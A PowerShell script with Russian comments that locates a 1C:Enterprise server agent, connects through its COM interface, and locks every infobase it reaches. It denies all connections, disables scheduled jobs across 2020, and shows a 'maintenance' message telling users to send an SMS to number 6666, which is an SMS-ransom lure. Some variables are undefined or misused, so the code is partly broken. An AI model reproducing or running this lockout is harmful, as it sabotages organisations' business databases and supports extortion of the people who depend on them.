$services1C = Get-WmiObject win32_service | ?{$_.Name -like '*'} |
    Select Name, DisplayName, State, PathName | 
    Where-Object { $_.PathName  -Like "*ragent.exe*" };

$services1C | % {
    $serviceInfo = $_;
    $serviceExecPath = $services1C.PathName;
    $serviceExecPathRagent = $services1C.PathName.split('"')[1]

    $hash = [ordered]@{}
    $serviceExecPath.Split("-").Trim() | Where-Object { $_.Contains(" ") } | ForEach-Object { 
        $name, $value = $_ -split '\s+', 2
        $hash[$name] = $value
    }

    if([System.IO.File]::Exists($serviceExecPathRagent) -ne $true)
    {        
        break
    }
    
    $platformVersion = [System.Diagnostics.FileVersionInfo]::GetVersionInfo($serviceExecPathRagent).FileVersion        
    $clusterPath = $hash.d -replace '"', ''
    $clusterRegPort = $hash.regport
    $clusterPort = $hash.port
    $clusterPortRange = $hash.range
    $clusterRegPath = "$clusterPath\reg_$clusterRegPort"

    $agentPort = $clusterPort;
    $agentAddress = "localhost";
    $clusterAdminName = ""; # Имя администратора кластера
    $clusterAdminPassword = ""; # Пароль администратора кластера
    $fullAgentAddress = "tcp://" + $agentAddress + ":" + $agentPort;

    $COMConnector = $null;
    try {
        if($platformVersion -like "8.2.*")
        {            
            $COMConnector = New-Object -COMObject "V82.COMConnector"
        }
        if($platformVersion -like "8.3.*")
        {
            $COMConnector = New-Object -COMObject "V83.COMConnector"
        }

        if($null -ne $COMConnector) {
            $serverAgent = $COMConnector.ConnectAgent($SrvAddr);
            $clusterList = $ServerAgent.GetClusters();
            foreach ($cluster in $clusterList) {
                $serverAgent.Authenticate($Cluster, $clusterAdminName, $clusterAdminPassword)                   
                
                $workingProcesses = $serverAgent.GetWorkingProcesses($cluster)
                foreach ($workProcess in $workingProcesses) {
                    if($workProcess.Running -ne 1)
                    {
                        continue
                    }

                    $workProcessConnectionString = "tcp://"+$workProcess.HostName+":"+$workProcess.MainPort
                    $workProcessConnection= $COMConnector.ConnectWorkingProcess($workProcessConnectionString)
                    
                    # Здесь должна быть аутентификация пользователя, имеющего доступ к информационной базе                    
                    $infobaseUserName = ""                    
                    $infobaseUserPassword = ""                    
                    $workProcessConnection.AddAuthentication($infobaseUserName, $infobaseUserPassword)
                    $infoBases = $workProcessConnection.GetInfoBases()
                    $infoBases | ForEach-Object {                
                        $itemInfobase = $_;                        
                        # Установка запрета соединения с информационной базой
                        $itemInfobase.ConnectDenied = $true
                        $itemInfobase.DeniedMessage = "База недоступна. Ведутся регламентные работы. Отправьте SMS на номер 6666"
                        $itemInfobase.PermissionCode = "123456"                      
                        $itemInfobase.DeniedFrom = "2020-01-01 00:00:00"
                        $itemInfobase.DeniedTo = "2020-12-31 23:59:59"
                        # Блокировка регламентных заданий
                        $itemInfobase.ScheduledJobsDenied = $true
                        # Сохраняем измененные настройки
                        $workProcessConnection.UpdateInfoBase($itemInfobase);
                        
                        $infobaseName = $itemInfobase.Name

                        Write-Host "Установлена блокировка подключений к базе $infobaseName" -ForegroundColor Green
                        Write-Host "Установлена блокировка регламентных заданий в базе $infobaseName" -ForegroundColor Green                        
                    }
                    
                    break
                }
            }
        }

        $COMConnector = $null
    } 
    catch {
        Write-Host "Ошибка при выполнении скрипта." -ForegroundColor Red;
        Write-Host "Подробно:" -ForegroundColor Red
        Write-Host $Error[0] -ForegroundColor Red
    }
}